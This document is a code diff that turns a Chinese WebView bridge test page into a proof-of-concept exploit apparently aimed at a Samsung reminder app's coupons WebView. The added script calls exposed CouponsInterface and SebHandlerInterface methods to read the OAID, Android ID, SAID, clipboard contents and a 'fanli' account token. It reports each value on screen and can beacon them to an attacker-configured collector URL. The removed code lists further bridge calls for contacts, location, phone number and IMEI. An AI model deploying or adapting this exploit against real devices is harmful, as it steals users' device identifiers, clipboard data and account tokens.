@@ -1,400 +1,60 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Android WebView JS 调用结果展示</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f5f7fa;
-      margin: 0;
-      padding: 24px;
-      color: #222;
-    }
-
-    h1 {
-      margin-bottom: 8px;
-    }
-
-    .desc {
-      color: #666;
-      margin-bottom: 20px;
-      line-height: 1.7;
-    }
-
-    .toolbar {
-      margin-bottom: 20px;
-    }
-
-    button {
-      padding: 10px 16px;
-      border: none;
-      border-radius: 8px;
-      background: #1677ff;
-      color: white;
-      cursor: pointer;
-      margin-right: 10px;
-    }
-
-    button:hover {
-      background: #0958d9;
-    }
-
-    .container {
-      display: flex;
-      flex-direction: column;
-      gap: 16px;
-    }
-
-    .card {
-      background: white;
-      border-radius: 12px;
-      padding: 16px;
-      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
-      border-left: 6px solid #d9d9d9;
-    }
-
-    .card.success {
-      border-left-color: #52c41a;
-    }
-
-    .card.error {
-      border-left-color: #ff4d4f;
-    }
-
-    .method {
-      font-weight: bold;
-      font-size: 16px;
-      margin-bottom: 10px;
-      word-break: break-all;
-    }
-
-    .status {
-      display: inline-block;
-      font-size: 12px;
-      padding: 3px 8px;
-      border-radius: 999px;
-      margin-bottom: 12px;
-      color: white;
-    }
-
-    .status.pending {
-      background: #faad14;
-    }
-
-    .status.success {
-      background: #52c41a;
-    }
-
-    .status.error {
-      background: #ff4d4f;
-    }
-
-    .label {
-      font-size: 13px;
-      color: #666;
-      margin-bottom: 4px;
-    }
-
-    pre {
-      background: #f7f7f7;
-      padding: 12px;
-      border-radius: 8px;
-      overflow-x: auto;
-      white-space: pre-wrap;
-      word-break: break-word;
-      margin: 0;
-    }
-  </style>
+<meta charset="utf-8">
+<title>poc</title>
+<style>
+body { background:#fff; color:#111; font-family:monospace; padding:12px; }
+#log { white-space:pre-wrap; word-break:break-all; font-size:13px; line-height:1.5; }
+.ok { color:#0a0; } .no { color:#a00; }
+</style>
 </head>
 <body>
-  <h1>Android WebView JS 调用结果</h1>
-  <div class="desc">
-    只需要在 <code>apiList</code> 中增加一行配置，就可以自动展示方法调用结果或错误信息。<br />
-    支持无参 / 有参 / 同步 / 异步(Promise) 方法。
-  </div>
+<h3>SReminder CouponsWebview JS-Bridge PoC</h3>
+<div id="log">loading...</div>
+<script>
+/* ============ 收集端(可选,能看 access log 的服务器) ============
+   不需要远端收集时把 COLLECTOR 留空字符串即可,只在界面显示 */
+var COLLECTOR = "";   // 例: "https://your-vps.com/collect"
 
-  <div class="toolbar">
-    <button onclick="runAll()">执行全部</button>
-    <button onclick="clearResults()">清空结果</button>
-  </div>
+var logEl = document.getElementById("log");
+var lines = [];
+function show(tag, val) {
+  var s = "[" + tag + "] " + val;
+  lines.push(s);
+  logEl.innerHTML = lines.join("\n") + "\n\n" + (lines.length > 1 ? "" : "");
+}
+function beacon(p) {
+  try { if (COLLECTOR) new Image().src = COLLECTOR + "?d=" + encodeURIComponent(p); } catch (e) {}
+}
+function report(tag, val) { show(tag, val); beacon(tag + "=" + val); }
+function probe(name, fn) {
+  try { report(name, fn()); } catch (e) { show(name, "EXCEPTION: " + e.message); }
+}
 
-  <div id="resultContainer" class="container"></div>
+/* getToken 回调:先定义,再调用 */
+window.tokcb = function (t) {
+  report("cp_token(fanli)", t === null || t === "null" ? "(获取失败/未登录)" : t);
+};
 
-  <script>
-    function escapeHtml(str) {
-      return String(str)
-        .replace(/&/g, "&amp;")
-        .replace(/</g, "&lt;")
-        .replace(/>/g, "&gt;")
-        .replace(/"/g, "&quot;")
-        .replace(/'/g, "&#039;");
-    }
+show("status", "页面已加载, UA=" + navigator.userAgent);
+report("page_loaded", "ua=" + navigator.userAgent);
 
-    function formatValue(value) {
-      if (value === undefined) return "undefined";
-      if (value === null) return "null";
-      if (typeof value === "string") return value;
+setTimeout(function () {
+  probe("getClientInfo", function () { return CouponsInterface.getClientInfo(); });
+  probe("getOAID", function () { return SebHandlerInterface.getOAID(); });
+  probe("getAndroidId", function () { return CouponsInterface.getAndroidId() || "(空:B门禁,host不在白名单)"; });
+  probe("getSAID", function () { return CouponsInterface.getSAID() || "(空:需security host+B门禁)"; });
+  probe("getClipBoardString", function () { return CouponsInterface.getClipBoardString() || "(空:购物助手功能未开)"; });
+  probe("isShoppingAssistantOn", function () { return CouponsInterface.isShoppingAssistantOn(); });
+  probe("getReverseId", function () { return CouponsInterface.getReverseId(); });
+  try {
+    report("getToken_call", "fanli,回调=tokcb");
+    CouponsInterface.getToken("fanli", "tokcb");
+  } catch (e) { show("getToken", "EXCEPTION: " + e.message); }
+}, 600);
 
-      try {
-        return JSON.stringify(value, null, 2);
-      } catch (e) {
-        return String(value);
-      }
-    }
-
-    function formatArg(arg) {
-      if (arg === undefined) return "undefined";
-      if (arg === null) return "null";
-      if (typeof arg === "string") return JSON.stringify(arg);
-      if (typeof arg === "number" || typeof arg === "boolean") return String(arg);
-
-      try {
-        return JSON.stringify(arg);
-      } catch (e) {
-        return String(arg);
-      }
-    }
-
-    function formatArgs(args = []) {
-      return args.map(formatArg).join(", ");
-    }
-
-    /**
-     * 构造调用器
-     * @param {string} objName window 上的对象名
-     * @param {string} method 方法名
-     * @param {Array} args 参数数组
-     */
-    function buildInvoker(objName, method, args = []) {
-      return () => {
-        const target = window[objName];
-        if (!target) {
-          throw new Error(`对象不存在: ${objName}`);
-        }
-
-        const fn = target[method];
-        if (typeof fn !== "function") {
-          throw new Error(`方法不存在: ${objName}.${method}`);
-        }
-
-        return fn.apply(target, args);
-      };
-    }
-
-    /**
-     * 更方便的配置方法
-     * 用法:
-     * makeApi("SebHandlerInterface", "setTitle", ["测试标题"])
-     */
-    function makeApi(objName, method, args = []) {
-      return {
-        name: `${objName}.${method}(${formatArgs(args)})`,
-        invoke: buildInvoker(objName, method, args)
-      };
-    }
-
-    const apiList = [
-      // =========================
-      // 示例：无参
-      // =========================
-      makeApi("samsungOTO", "getAddress"),
-      makeApi("samsungOTO", "getAppName"),
-      makeApi("SebHandlerInterface", "getOAID"),
-      makeApi("SamsungAccount", "getDeviceId"),
-
-      // =========================
-      // 示例：单参数
-      // =========================
-      // makeApi("SebHandlerInterface", "setTitle", ["测试标题"]),
-      // makeApi("SebHandlerInterface", "setNeedReload", [true]),
-
-      // =========================
-      // 示例：多参数
-      // =========================
-      // makeApi("SamsungAccount", "postMsg", ["typeA", "hello world"]),
-      // makeApi("SamsungAccount", "nameCheck", ["test_user", 123]),
-
-      // =========================
-      // 示例：对象参数
-      // =========================
-      // makeApi("samsungOTO", "someMethod", [{ id: 1, name: "test" }]),
-
-      // =========================
-      // 你当前要测的接口，直接改这里
-      // =========================
-      // makeApi("samsungOTO", "setTopUpReminderCard", ["10086"]),
-
-      // 你以后只需要继续追加类似这一行即可：
-      // makeApi("SebHandlerInterface", "setTitle", ["新的标题"]),
-      // makeApi("SamsungAccount", "postMsg", ["notice", "hello"]),
-      makeApi("BenefitInterface", "getAccessToken", []),
-    ];
-
-
-    // const apiList = [
-  // ===== samsungOTO =====
-  // { name: "samsungOTO.getAddress()", invoke: buildInvoker("samsungOTO", "getAddress") },
-  // { name: "samsungOTO.getAppName()", invoke: buildInvoker("samsungOTO", "getAppName") },
-  // { name: "samsungOTO.getClientInfo()", invoke: buildInvoker("samsungOTO", "getClientInfo") },
-  // { name: "samsungOTO.getContacts()", invoke: buildInvoker("samsungOTO", "getContacts") },
-  // { name: "samsungOTO.getEncryptOAID()", invoke: buildInvoker("samsungOTO", "getEncryptOAID") },
-  // { name: "samsungOTO.getEncryptThirdPartyUid()", invoke: buildInvoker("samsungOTO", "getEncryptThirdPartyUid") },
-  // { name: "samsungOTO.getLocation()", invoke: buildInvoker("samsungOTO", "getLocation") },
-  // { name: "samsungOTO.getPlatformInfomation()", invoke: buildInvoker("samsungOTO", "getPlatformInfomation") },
-  // // { name: "samsungOTO.getQRCodeResult()", invoke: buildInvoker("samsungOTO", "getQRCodeResult") },
-
-  // { name: "samsungOTO.getWXDetailUserInfo()", invoke: buildInvoker("samsungOTO", "getWXDetailUserInfo") },
-  // { name: "samsungOTO.getWXUserInfo()", invoke: buildInvoker("samsungOTO", "getWXUserInfo") },
-  // { name: "samsungOTO.isAppExitNormal()", invoke: buildInvoker("samsungOTO", "isAppExitNormal") },
-  // { name: "samsungOTO.isWXAppInstalled()", invoke: buildInvoker("samsungOTO", "isWXAppInstalled") },
-  // { name: "samsungOTO.loggingUserAction()", invoke: buildInvoker("samsungOTO", "loggingUserAction") },
-  // { name: "samsungOTO.onCollectFlight()", invoke: buildInvoker("samsungOTO", "onCollectFlight") },
-  // { name: "samsungOTO.setTopUpReminderCard()", invoke: buildInvoker("samsungOTO", "setTopUpReminderCard") },
-  // { name: "samsungOTO.shareImageForSos()", invoke: buildInvoker("samsungOTO", "shareImageForSos") },
-  // { name: "samsungOTO.shareImageWithBase64String()", invoke: buildInvoker("samsungOTO", "shareImageWithBase64String") },
-
-  // { name: "samsungOTO.shareImageWithUri()", invoke: buildInvoker("samsungOTO", "shareImageWithUri") },
-  // { name: "samsungOTO.shareWebpageToWechat()", invoke: buildInvoker("samsungOTO", "shareWebpageToWechat") },
-  // // { name: "samsungOTO.startEmergencyContact()", invoke: buildInvoker("samsungOTO", "startEmergencyContact") },
-  // { name: "samsungOTO.unCollectFlight()", invoke: buildInvoker("samsungOTO", "unCollectFlight") },
-  // { name: "samsungOTO.versionCompare()", invoke: buildInvoker("samsungOTO", "versionCompare") },
-
-  // // ===== SebHandlerInterface =====
-  // { name: "SebHandlerInterface.downloadFile()", invoke: buildInvoker("SebHandlerInterface", "downloadFile") },
-  // // { name: "SebHandlerInterface.enterEcommerceTab()", invoke: buildInvoker("SebHandlerInterface", "enterEcommerceTab") },
-  // // { name: "SebHandlerInterface.finishActivity()", invoke: buildInvoker("SebHandlerInterface", "finishActivity") },
-  // { name: "SebHandlerInterface.getJDTrackUrl()", invoke: buildInvoker("SebHandlerInterface", "getJDTrackUrl") },
-  // { name: "SebHandlerInterface.getOAID()", invoke: buildInvoker("SebHandlerInterface", "getOAID") },
-  // { name: "SebHandlerInterface.getOriginalReferrer()", invoke: buildInvoker("SebHandlerInterface", "getOriginalReferrer") },
-  // { name: "SebHandlerInterface.getTraceId()", invoke: buildInvoker("SebHandlerInterface", "getTraceId") },
-  // { name: "SebHandlerInterface.isDeviceRoot()", invoke: buildInvoker("SebHandlerInterface", "isDeviceRoot") },
-  // { name: "SebHandlerInterface.isInDarkMode()", invoke: buildInvoker("SebHandlerInterface", "isInDarkMode") },
-
-  // // 新增这一批 👇
-  // { name: "SebHandlerInterface.isShoppingAssistantOn()", invoke: buildInvoker("SebHandlerInterface", "isShoppingAssistantOn") },
-  // { name: "SebHandlerInterface.newWebViewActivityWithHomeAsUp()", invoke: buildInvoker("SebHandlerInterface", "newWebViewActivityWithHomeAsUp") },
-  // { name: "SebHandlerInterface.newWebViewActivityWithoutActionbar()", invoke: buildInvoker("SebHandlerInterface", "newWebViewActivityWithoutActionbar") },
-  // { name: "SebHandlerInterface.preventParentTouchEvent()", invoke: buildInvoker("SebHandlerInterface", "preventParentTouchEvent") },
-  // { name: "SebHandlerInterface.setNeedReload()", invoke: buildInvoker("SebHandlerInterface", "setNeedReload") },
-  // { name: "SebHandlerInterface.setTitle()", invoke: buildInvoker("SebHandlerInterface", "setTitle") },
-  // { name: "SebHandlerInterface.tapBanner()", invoke: buildInvoker("SebHandlerInterface", "tapBanner") },
-  // // { name: "SebHandlerInterface.turnOnShoppingAssistant()", invoke: buildInvoker("SebHandlerInterface", "turnOnShoppingAssistant") },
-
-
-  //   // ===== SamsungAccount =====
-  // { name: "SamsungAccount.addShortCut()", invoke: buildInvoker("SamsungAccount", "addShortCut") },
-  // { name: "SamsungAccount.cancelShopEventRemindTime()", invoke: buildInvoker("SamsungAccount", "cancelShopEventRemindTime") },
-  // { name: "SamsungAccount.cancelShoppingReminder()", invoke: buildInvoker("SamsungAccount", "cancelShoppingReminder") },
-  // { name: "SamsungAccount.checkShopEventState()", invoke: buildInvoker("SamsungAccount", "checkShopEventState") },
-  // { name: "SamsungAccount.createOrUpdateShopEventReminder()", invoke: buildInvoker("SamsungAccount", "createOrUpdateShopEventReminder") },
-  // { name: "SamsungAccount.earnRewards()", invoke: buildInvoker("SamsungAccount", "earnRewards") },
-  // { name: "SamsungAccount.getClientUserInfo()", invoke: buildInvoker("SamsungAccount", "getClientUserInfo") },
-  // { name: "SamsungAccount.getDeviceIMEIWithRSA()", invoke: buildInvoker("SamsungAccount", "getDeviceIMEIWithRSA") },
-  // { name: "SamsungAccount.getDeviceId()", invoke: buildInvoker("SamsungAccount", "getDeviceId") },
-  // { name: "SamsungAccount.getIsSepLiteAvailable()", invoke: buildInvoker("SamsungAccount", "getIsSepLiteAvailable") },
-  // { name: "SamsungAccount.getModelName()", invoke: buildInvoker("SamsungAccount", "getModelName") },
-  // { name: "SamsungAccount.getPhoneNumber()", invoke: buildInvoker("SamsungAccount", "getPhoneNumber") },
-  // { name: "SamsungAccount.getRewardAccessKey()", invoke: buildInvoker("SamsungAccount", "getRewardAccessKey") },
-  // { name: "SamsungAccount.getRewardAccessToken()", invoke: buildInvoker("SamsungAccount", "getRewardAccessToken") },
-  // { name: "SamsungAccount.getRewardCache()", invoke: buildInvoker("SamsungAccount", "getRewardCache") },
-  // { name: "SamsungAccount.getSAGuid()", invoke: buildInvoker("SamsungAccount", "getSAGuid") },
-  // { name: "SamsungAccount.getSAID()", invoke: buildInvoker("SamsungAccount", "getSAID") },
-  // { name: "SamsungAccount.getSAStatus()", invoke: buildInvoker("SamsungAccount", "getSAStatus") },
-
-  // { name: "SamsungAccount.getSAGuid()", invoke: buildInvoker("SamsungAccount", "getSAGuid") },
-  // { name: "SamsungAccount.getSAID()", invoke: buildInvoker("SamsungAccount", "getSAID") },
-  // { name: "SamsungAccount.getSAStatus()", invoke: buildInvoker("SamsungAccount", "getSAStatus") },
-  // { name: "SamsungAccount.getSha256DeviceIMEI()", invoke: buildInvoker("SamsungAccount", "getSha256DeviceIMEI") },
-  // { name: "SamsungAccount.getTraceId()", invoke: buildInvoker("SamsungAccount", "getTraceId") },
-  // { name: "SamsungAccount.getVeriCode()", invoke: buildInvoker("SamsungAccount", "getVeriCode") },
-  // { name: "SamsungAccount.getVisitURL()", invoke: buildInvoker("SamsungAccount", "getVisitURL") },
-  // { name: "SamsungAccount.getWatchingVideoCountdown()", invoke: buildInvoker("SamsungAccount", "getWatchingVideoCountdown") },
-  // { name: "SamsungAccount.login()", invoke: buildInvoker("SamsungAccount", "login") },
-  // { name: "SamsungAccount.nameCheck()", invoke: buildInvoker("SamsungAccount", "nameCheck") },
-  // { name: "SamsungAccount.postMsg()", invoke: buildInvoker("SamsungAccount", "postMsg") },
-  // { name: "SamsungAccount.queryShortCutExist()", invoke: buildInvoker("SamsungAccount", "queryShortCutExist") },
-  // { name: "SamsungAccount.setPageDescription()", invoke: buildInvoker("SamsungAccount", "setPageDescription") },
-  // { name: "SamsungAccount.setShareDescriptionCallback()", invoke: buildInvoker("SamsungAccount", "setShareDescriptionCallback") },
-  // { name: "SamsungAccount.setShoppingReminder()", invoke: buildInvoker("SamsungAccount", "setShoppingReminder") },
-  // { name: "SamsungAccount.startSassistantParadisePage()", invoke: buildInvoker("SamsungAccount", "startSassistantParadisePage") },
-  // { name: "SamsungAccount.updateRewardsStatus()", invoke: buildInvoker("SamsungAccount", "updateRewardsStatus") },
-  // { name: "SamsungAccount.watchingVideo()", invoke: buildInvoker("SamsungAccount", "watchingVideo") },
-// ];
-
-    const resultContainer = document.getElementById("resultContainer");
-
-    function createCard(item) {
-      const card = document.createElement("div");
-      card.className = "card";
-
-      card.innerHTML = `
-        <div class="method">${escapeHtml(item.name)}</div>
-        <div class="status pending">执行中</div>
-
-        <div class="label">结果</div>
-        <pre class="result">等待执行...</pre>
-
-        <div class="label" style="margin-top:12px;">错误信息</div>
-        <pre class="errorText">无</pre>
-      `;
-
-      resultContainer.appendChild(card);
-      return card;
-    }
-
-    async function runOne(item) {
-      const card = createCard(item);
-      const statusEl = card.querySelector(".status");
-      const resultEl = card.querySelector(".result");
-      const errorEl = card.querySelector(".errorText");
-
-      try {
-        // 兼容同步方法 / Promise 方法
-        const result = await Promise.resolve(item.invoke());
-
-        card.classList.remove("error");
-        card.classList.add("success");
-
-        statusEl.className = "status success";
-        statusEl.textContent = "成功";
-
-        resultEl.textContent = formatValue(result);
-        errorEl.textContent = "无";
-      } catch (err) {
-        card.classList.remove("success");
-        card.classList.add("error");
-
-        statusEl.className = "status error";
-        statusEl.textContent = "失败";
-
-        resultEl.textContent = "无结果";
-        errorEl.textContent = err && err.stack ? err.stack : String(err);
-      }
-    }
-
-    async function runAll() {
-      clearResults();
-
-      for (const item of apiList) {
-        try {
-          await runOne(item);
-        } catch (e) {
-          // 双保险：确保单个任务异常不会影响后续执行
-          console.error("runOne failed:", e);
-        }
-      }
-    }
-
-    function clearResults() {
-      resultContainer.innerHTML = "";
-    }
-
-    // 页面加载后自动执行，可按需注释掉
-    window.onload = () => {
-      runAll();
-    };
-  </script>
+setTimeout(function () { report("page_done", "所有探测完成"); }, 20000);
+</script>
 </body>
 </html>
